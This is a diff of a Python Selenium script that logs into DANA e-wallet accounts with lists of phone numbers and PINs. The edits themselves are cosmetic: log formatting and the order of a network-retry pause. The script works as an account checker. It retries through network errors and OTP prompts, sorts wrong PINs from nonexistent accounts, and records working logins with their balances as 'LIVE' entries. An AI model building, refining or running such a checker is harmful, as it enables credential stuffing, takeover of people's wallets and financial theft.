@@ -88,14 +88,15 @@ def input_no(driver, no, pin):
 
 	networkError 	= check_element(driver, "//*[contains(text(), 'The network connection is unstable. Please try again later.')]", 'no_delay')
 	if networkError:
-		time.sleep(60)
 		print("[*] Unstable Network!")
+		print("[*] Waiting for 60 secs ...")
+		time.sleep(60)
 		input_no(driver, no, pin)
 
 	# End Check
 
 def login(page, no, pin):
-	print("[*] Login {} | {}".format(no, pin))
+	print("\t[*] Login {} | {}".format(no, pin))
 
 	# Configuration
 
@@ -122,27 +123,27 @@ def login(page, no, pin):
 	accountCheck 	= check_element(driver, "//*[contains(text(), 'The OTP you inserted is incorrect. Please try again')]", 0.5)
 	
 	if accountCheck:
-		print("[+] No DANA Account {} | {}".format(no, pin))
+		print("\t[+] No DANA Account {} | {}".format(no, pin))
 		driver_exit(driver)
 	
 	wrongPin 		= check_element(driver, "//*[contains(text(), 'Please make sure you have the right PIN and try again.')]", 0.5)
 	if wrongPin:
-		print("[*] Wrong PIN {} | {}".format(no, pin))
+		print("\t[+] Wrong PIN {} | {}".format(no, pin))
 		driver_exit(driver)
 
 	otpCheck 		= check_element(driver, '//input[@type="tel"', 1)
 	if otpCheck:
-		print("[*] OTP After Login => {} | {}".format(no, pin))
+		print("\t[+] OTP After Login => {} | {}".format(no, pin))
 		login(page, no, pin)
 
 	successLogin 	= check_element(driver, '//div[@arrow="down"]', 1)
 
 	if successLogin:
 		successLogin.click()
-		print("[+] Login OK! {} | {}".format(no, pin))
+		print("\t[+] Login OK! {} | {}".format(no, pin))
 		balanceCheck = check_element(driver, '//div[@class="accordion-content-container accordion-group"]', 1)
 		if balanceCheck:
-			output("[+] LIVE => {} | {} | {}".format(no, pin, balanceCheck.text))
+			output("\t[+] LIVE => {} | {} | {}".format(no, pin, balanceCheck.text))
 			driver_exit(driver)
 	else:
 		driver_exit(driver)
